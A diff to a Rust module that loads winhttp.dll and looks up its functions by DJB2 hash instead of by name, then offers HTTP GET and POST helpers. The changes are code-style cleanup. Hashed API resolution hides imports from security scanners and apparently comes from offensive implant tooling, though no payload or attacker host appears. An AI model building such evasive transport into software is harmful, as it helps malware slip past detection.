@@ -1,8 +1,4 @@
-use alloc::{
-    format,
-    string::{String, ToString},
-    vec::Vec,
-};
+use alloc::{borrow::ToOwned as _, format, string::String, vec::Vec};
 use core::{
     ffi::c_void,
     ptr::{null, null_mut},
@@ -50,19 +46,6 @@ static INIT_WINHTTP: AtomicBool = AtomicBool::new(false);
 fn init_winhttp_funcs() {
     unsafe {
         if !INIT_WINHTTP.load(Ordering::Acquire) {
-            pub const WINHTTP_OPEN_DBJ2: usize = 0x613eace5;
-            pub const WINHTTP_CONNECT_DBJ2: usize = 0x81e0c81d;
-            pub const WINHTTP_OPEN_REQUEST_DBJ2: usize = 0xb06d900e;
-            pub const WINHTTP_SET_OPTION_DBJ2: usize = 0x5b6ad378;
-            pub const WINHTTP_CLOSE_HANDLE_DBJ2: usize = 0xa7355f15;
-            pub const WINHTTP_SEND_REQUEST_DBJ2: usize = 0x7739d0e6;
-            pub const WINHTTP_ADD_REQUEST_HEADERS_DBJ2: usize = 0xa2c0b0e1;
-            pub const WINHTTP_RECEIVE_RESPONSE_DBJ2: usize = 0xae351ae5;
-            pub const WINHTTP_READ_DATA_DBJ2: usize = 0x75064b89;
-            pub const WINHTTP_QUERY_HEADERS_DBJ2: usize = 0xcc1a89c5;
-            pub const WINHTTP_GET_IE_PROXY_CONFIG_FOR_CURRENT_USER_DBJ2: usize = 0x028197a2;
-            pub const WINHTTP_GET_PROXY_FOR_URL_DBJ2: usize = 0xa2cf3c6f;
-
             let dll_name = "winhttp.dll";
             let mut winhttp_dll_unicode = UnicodeString::new();
             let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect();
@@ -81,13 +64,13 @@ fn init_winhttp_funcs() {
             }
 
             if winhttp_handle.is_null() {
-                panic!("Failed to load winhttp.dll");
+                return;
             }
 
             let h_module = winhttp_handle as *mut u8;
 
             if h_module.is_null() {
-                panic!("Failed to load winhttp.dll");
+                return;
             }
 
             let mut winhttp_functions = WinHttp::new();
@@ -95,64 +78,60 @@ fn init_winhttp_funcs() {
             resolve_direct_syscalls!(
                 h_module,
                 [
-                    (
-                        winhttp_functions.win_http_open,
-                        WINHTTP_OPEN_DBJ2,
-                        WinHttpOpenFunc
-                    ),
+                    (winhttp_functions.win_http_open, 0x613eace5, WinHttpOpenFunc),
                     (
                         winhttp_functions.win_http_connect,
-                        WINHTTP_CONNECT_DBJ2,
+                        0x81e0c81d,
                         WinHttpConnectFunc
                     ),
                     (
                         winhttp_functions.win_http_open_request,
-                        WINHTTP_OPEN_REQUEST_DBJ2,
+                        0xb06d900e,
                         WinHttpOpenRequestFunc
                     ),
                     (
                         winhttp_functions.win_http_set_option,
-                        WINHTTP_SET_OPTION_DBJ2,
+                        0x5b6ad378,
                         WinHttpSetOptionFunc
                     ),
                     (
                         winhttp_functions.win_http_close_handle,
-                        WINHTTP_CLOSE_HANDLE_DBJ2,
+                        0xa7355f15,
                         WinHttpCloseHandleFunc
                     ),
                     (
                         winhttp_functions.win_http_send_request,
-                        WINHTTP_SEND_REQUEST_DBJ2,
+                        0x7739d0e6,
                         WinHttpSendRequestFunc
                     ),
                     (
                         winhttp_functions.win_http_add_request_headers,
-                        WINHTTP_ADD_REQUEST_HEADERS_DBJ2,
+                        0xa2c0b0e1,
                         WinHttpAddRequestHeadersFunc
                     ),
                     (
                         winhttp_functions.win_http_receive_response,
-                        WINHTTP_RECEIVE_RESPONSE_DBJ2,
+                        0xae351ae5,
                         WinHttpReceiveResponseFunc
                     ),
                     (
                         winhttp_functions.win_http_read_data,
-                        WINHTTP_READ_DATA_DBJ2,
+                        0x75064b89,
                         WinHttpReadDataFunc
                     ),
                     (
                         winhttp_functions.win_http_query_headers,
-                        WINHTTP_QUERY_HEADERS_DBJ2,
+                        0xcc1a89c5,
                         WinHttpQueryHeadersFunc
                     ),
                     (
                         winhttp_functions.win_http_get_ie_proxy_config_for_current_user,
-                        WINHTTP_GET_IE_PROXY_CONFIG_FOR_CURRENT_USER_DBJ2,
+                        0x028197a2,
                         WinHttpGetIEProxyConfigForCurrentUserFunc
                     ),
                     (
                         winhttp_functions.win_http_get_proxy_for_url,
-                        WINHTTP_GET_PROXY_FOR_URL_DBJ2,
+                        0xa2cf3c6f,
                         WinHttpGetProxyForUrlFunc
                     )
                 ]
@@ -181,7 +160,7 @@ fn init_winhttp_funcs() {
 )]
 pub fn get_winhttp() -> &'static WinHttp {
     init_winhttp_funcs();
-    return unsafe { WINHTTP_FUNCS.as_ref().unwrap() };
+    unsafe { WINHTTP_FUNCS.as_ref().unwrap() }
 }
 
 /// Represents an HTTP response.
@@ -199,6 +178,9 @@ pub struct Response {
 ///
 /// # Arguments
 /// * `h_request` - The HTTP request handle.
+///
+/// # Safety
+/// This function is unsafe because it dereferences a raw pointer.
 ///
 /// # Returns
 /// * `Ok(Response)` with the response if the operation was successful.
@@ -225,7 +207,7 @@ pub unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> 
         }
     }
     else {
-        return Err(("WinHttpQueryHeaders failed with error: {}").to_string());
+        return Err(("WinHttpQueryHeaders failed with error: {}").to_owned());
     }
 
     let mut buffer: [u8; 4096] = [0; 4096];
@@ -243,11 +225,13 @@ pub unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> 
             if b_result == 0 || bytes_read == 0 {
                 break;
             }
-            response_body.push_str(&String::from_utf8_lossy(&buffer[.. bytes_read as usize]));
+            response_body.push_str(&String::from_utf8_lossy(
+                buffer.get(.. bytes_read as usize).unwrap(),
+            ));
         }
     }
     else {
-        return Err("win_http_read_data function is not available".to_string());
+        return Err("win_http_read_data function is not available".to_owned());
     }
 
     Ok(Response {
@@ -380,7 +364,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
             }
         }
 
-        Err("WinHttp functions are not available".to_string())
+        Err("WinHttp functions are not available".to_owned())
     }
 }
 
@@ -518,7 +502,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
             }
         }
 
-        Err("WinHttp functions are not available".to_string())
+        Err("WinHttp functions are not available".to_owned())
     }
 }
 
